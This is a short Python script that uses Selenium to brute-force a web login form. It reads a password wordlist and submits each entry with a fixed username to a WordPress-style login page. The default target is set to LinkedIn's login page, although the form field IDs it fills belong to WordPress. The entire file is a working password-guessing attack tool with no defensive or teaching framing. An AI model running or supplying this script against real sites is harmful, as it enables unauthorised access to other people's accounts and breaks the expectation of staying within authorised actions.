"""
Usage:
    python selenium-brute.py -h
    python selenium-brute.py -t http://localhost/wp-login.php -u admin -p password.txt
"""

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from optparse import OptionParser
import sys

# Argument parser
parser = OptionParser()
parser.add_option("-t", dest="target", help="target's URL", default="https://www.linkedin.com/uas/login")
parser.add_option("-u", dest="user", help="username", default="test")
parser.add_option("-p", dest="pas", help="wordlist file (e.g., password.txt)")
(options, args) = parser.parse_args(sys.argv)

# Get CLI inputs
url = options.target
curuser = options.user
file = options.pas

# Read passwords from file
passwords = []
with open(file, "r") as s:
    passwords = [line.strip() for line in s if line.strip()]

# Start Chrome with Selenium 4
chrome_options = Options()
service = Service(r'chromedriver.exe')
driver = webdriver.Chrome(service=service, options=chrome_options)

# Open target login page
driver.get(url)

# Brute force function
def loginuserpass(passw):
    print(f"Trying -> username: {curuser} | password: {passw}")

    # Find and fill in username
    username = driver.find_element(By.ID, "user_login")
    username.clear()
    username.send_keys(curuser)

    # Find and fill in password
    password = driver.find_element(By.ID, "user_pass")
    password.clear()
    password.send_keys(passw)

    # Click login button
    driver.find_element(By.ID, "wp-submit").click()

    # Print new URL to check if login succeeded
    print("Redirected to:", driver.current_url)
    print("-" * 40)

# Loop through password list
for pw in passwords:
    loginuserpass(pw)
    driver.get(url)  # Reload login page between attempts
